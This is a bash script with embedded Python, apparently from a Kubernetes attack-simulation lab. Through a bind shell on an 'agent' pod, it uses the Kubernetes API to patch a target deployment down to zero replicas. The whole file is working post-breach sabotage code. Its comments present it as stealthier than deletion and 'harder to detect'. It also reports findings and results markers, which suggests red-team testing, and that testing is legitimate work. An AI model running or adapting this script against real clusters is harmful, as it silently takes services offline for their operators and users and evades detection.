#!/usr/bin/env bash
# Sabotage: scale target deployments to zero replicas via k8s API PATCH.
# More subtle than deletion — the deployment still exists but serves no traffic.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-scale-zero.sh [NAMESPACE] [DEPLOYMENT]"
  echo "  Patches a deployment to replicas=0 via Kubernetes API."
  echo "  Default: inventory-app in target-apps namespace."
  echo ""
  echo "  Requires: bind shell open + RBAC with apps/deployments patch permission"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

TARGET_NS="${1:-target-apps}"
TARGET_DEPLOY="${2:-inventory-app}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: Scale to Zero"
echo "@PHASE Scale-Zero"

PYTHON_CODE="${K8S_API_PREAMBLE}

target_ns = '${TARGET_NS}'
target_deploy = '${TARGET_DEPLOY}'

print('@PHASE Check-Deployment')
print('=' * 60)
print('  SABOTAGE: Scale to Zero')
print('=' * 60)
print(f'  Target: {target_deploy} in {target_ns}')
print()

# First, check current state
deploy = k8s_get(f'/apis/apps/v1/namespaces/{target_ns}/deployments/{target_deploy}')
if 'error' in deploy:
    print(f'  Error reading deployment: HTTP {deploy[\"error\"]}')
    if deploy['error'] == 404:
        print(f'  Deployment {target_deploy} not found in {target_ns}.')
        # List available deployments
        deploys = k8s_get(f'/apis/apps/v1/namespaces/{target_ns}/deployments')
        if 'error' not in deploys:
            names = [d['metadata']['name'] for d in deploys.get('items', [])]
            print(f'  Available deployments: {names}')
    sys.exit(1)

current_replicas = deploy.get('spec', {}).get('replicas', 0)
print(f'  Current replicas: {current_replicas}')
print(f'@FINDING info {target_deploy} has {current_replicas} replicas')

if current_replicas == 0:
    print('  Already at 0 replicas — nothing to do.')
    print('@RESULT success Already at 0 replicas')
    sys.exit(0)

print('@PHASE Patch-Deployment')
# Patch to 0
patch = [{'op': 'replace', 'path': '/spec/replicas', 'value': 0}]
result, status = k8s_patch(
    f'/apis/apps/v1/namespaces/{target_ns}/deployments/{target_deploy}',
    patch
)

if status == 200:
    print(f'  Scaled {target_deploy} from {current_replicas} -> 0 replicas.')
    print('  The deployment exists but serves no traffic.')
    print('  This is harder to detect than outright deletion.')
    print(f'@FINDING critical {target_deploy} scaled from {current_replicas} to 0 replicas')
    print(f'@RESULT success Scaled {target_deploy} to 0 replicas')
elif status == 403:
    print(f'  Access denied (HTTP {status}). RBAC does not allow deployment patching.')
    print(f'@RESULT failure RBAC denied deployment patching')
else:
    print(f'  Failed: HTTP {status}')
    print(f'  Response: {json.dumps(result, indent=2)[:500]}')
    print(f'@RESULT failure Scale-to-zero failed with HTTP {status}')

print()
print('Scale-to-zero sabotage complete.')
"

echo "  Target: $TARGET_DEPLOY in $TARGET_NS"
echo "  Piping scale-to-zero script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Scale-to-zero complete."
